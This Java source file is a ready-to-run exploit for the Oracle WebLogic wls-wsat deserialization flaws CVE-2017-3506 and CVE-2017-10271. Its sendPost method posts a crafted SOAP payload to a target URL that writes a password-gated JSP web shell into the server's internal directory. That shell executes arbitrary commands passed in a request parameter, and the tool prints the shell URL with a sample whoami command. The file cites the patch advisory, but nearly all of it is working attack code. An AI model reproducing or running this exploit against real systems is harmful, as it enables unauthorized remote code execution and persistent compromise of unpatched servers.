package com.secfree.www.attack;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;

public class exploit {
	
	public static void main(String[] args) throws InterruptedException {
		if(args.length  <= 0){
			System.out.println("\n[*]              Oracle : WebLogic wls-wsat RCE Exp");
			System.out.println("\n[*]              CVE ID : CVE-2017-3506 & CVE-2017-10271");
			System.out.println("\n[*]  Vulnerability info : https://secfree.com/article-635.html");
			System.out.println("\n[*]              Author : Bearcat@secfree.com");
			System.out.println("\n[*]  Vulnerability page £ºwls-wsat/CoordinatorPortType & wls-wsat/CoordinatorPortType11 ");
			System.out.println("\n[*]               Usage £ºjava -jar WebLogic_Wls-Wsat_RCE_Exp.jar http://xxx.xxx.xxx.xxx:7001 test.jsp");
			System.out.println("\n[*] Vulnerability patch : http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html\n");
		}else{
			System.out.print("\n[*] Starting exploit");
			for (int i = 0; i < 3; i++) {
				Thread.sleep(300);
				System.out.print(".");
			}
			System.out.print("\n[*] Sending payloads");
			for (int i = 0; i < 3; i++) {
				Thread.sleep(300);
				System.out.print(".");
			}
			System.out.print("\n[*] Payloads sent");
			for (int i = 0; i < 3; i++) {
				Thread.sleep(300);
				System.out.print(".");
			}
			System.out.print("\n[*] Opening shell");
			for (int i = 0; i < 3; i++) {
				Thread.sleep(300);
				System.out.print(".");
			}
			System.out.print("\n[*] pwned! Go ahead");
			for (int i = 0; i < 3; i++) {
				Thread.sleep(300);
				System.out.print(".");
			}
			System.out.println("\n");
			System.out.println(sendPost(args[0], args[1]));
		}
	}
	
	public static String sendPost(String url,String cmdFileName) {
		String cmdFilePath = "servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/" + cmdFileName;
		String payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><java version=\"1.4.0\" class=\"java.beans.XMLDecoder\"><object class=\"java.io.PrintWriter\"> <string>" + cmdFilePath + "</string><void method=\"println\"><string><![CDATA[<% if(\"secfree\".equals(request.getParameter(\"password\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"command\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"<pre>\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"</pre>\"); } %>]]></string></void><void method=\"close\"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>";
        PrintWriter out = null;
        BufferedReader in = null;
        String result = "";
        try {
            URL realUrl = new URL(url + "/wls-wsat/CoordinatorPortType11");
            URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)");
            conn.setRequestProperty("Content-Type", "text/xml");
            conn.setRequestProperty("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            out.print(payload);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result += line;
            }
        } catch (Exception e) {
        	System.out.println("[+] " + url + "/bea_wls_internal/" + cmdFileName + "?password=secfree&command=whoami");
        }
        finally{
            try{
                if(out!=null){
                    out.close();
                }
                if(in!=null){
                    in.close();
                }
            }
            catch(IOException ex){
                ex.printStackTrace();
            }
        }
        return result;
    }    
}